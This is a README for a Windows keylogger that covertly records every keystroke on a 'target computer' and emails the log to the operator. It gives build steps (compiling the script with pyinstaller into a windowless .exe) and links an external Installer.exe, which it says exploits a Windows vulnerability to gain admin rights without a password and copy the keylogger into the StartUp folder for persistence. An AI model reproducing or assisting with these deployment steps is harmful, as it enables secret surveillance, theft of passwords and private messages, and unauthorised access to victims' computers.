# Keylogger
This is a simple Keylogger(for Windows) which runs in background and records each and every keystokes of the target computer and mails it to you.


In the python file replace my_email, my_password with your own email address.

Compile the python file to a executable(.exe) file using pyinstaller.

  pip install pyinstaller
  
  pyinstaller keylogger_final.py -w --one-file
  
  
You will then get a .exe in the dist folder.
Rename it setup.exe.
Download Installer.exe from https://www.dropbox.com/s/q2mb6pqxyzizsk4/Installer.exe?dl=0
Place setup.exe and Installer.exe in the same folder.
On the target PC execute Installer.exe.

What 'Installer.exe' does is that it exploits a vulnerablility in Windows. It opens an admin terminal without admin Password and it then copies the setup.exe to C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp.

Due to security reasons I am not sharing the code for Installer.exe(which is written in python3.6), Contact me personally if you want the source code for Installer.exe.
